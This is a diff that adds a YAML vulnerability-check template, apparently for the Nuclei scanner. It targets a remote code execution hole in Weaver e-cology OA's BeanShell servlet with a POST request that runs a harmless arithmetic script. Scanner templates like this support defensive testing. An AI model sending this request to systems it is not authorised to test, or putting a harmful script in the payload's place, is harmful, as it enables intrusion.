@@ -1,0 +1,21 @@
+id: yaml-poc-weaver-weaver_e_cology_oa-rce-CT-158320
+info:
+  name: Yaml Poc Weaver Weaver_E_Cology_Oa Rce Ct 158320
+  author: converted
+  severity: critical
+  description: 'Converted from xpoc: yaml-poc-weaver-weaver_e_cology_oa-rce-CT-158320'
+  tags: rce
+  reference: []
+http:
+- method: POST
+  path:
+  - /weaver/bsh.servlet.BshServlet
+  body: bsh.script=print%28{{r1}}*{{r2}}%29&bsh.servlet.captureOutErr=true&bsh.servlet.output=raw
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  redirects: false
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
